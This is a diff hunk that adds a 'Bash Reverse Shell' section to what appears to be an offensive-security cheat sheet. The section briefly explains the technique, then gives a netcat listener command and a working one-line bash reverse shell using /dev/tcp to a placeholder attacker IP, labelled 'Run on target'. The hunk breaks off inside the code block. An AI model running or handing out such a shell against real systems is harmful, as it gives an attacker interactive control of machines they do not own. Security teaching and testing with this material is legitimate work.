@@ -542,5 +542,19 @@ $port = 4444;
 
 
 ---
+<details>
+<summary>Bash Reverse Shell</summary>
 
+### What is it?
+A reverse shell makes the target connect back to your machine so you get control.
+
+---
+
+### Step 1: Start listener (your machine)
+```bash
+nc -lvnp 4444
+
+### Step 2: Run on target
+```bash 
+bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
 
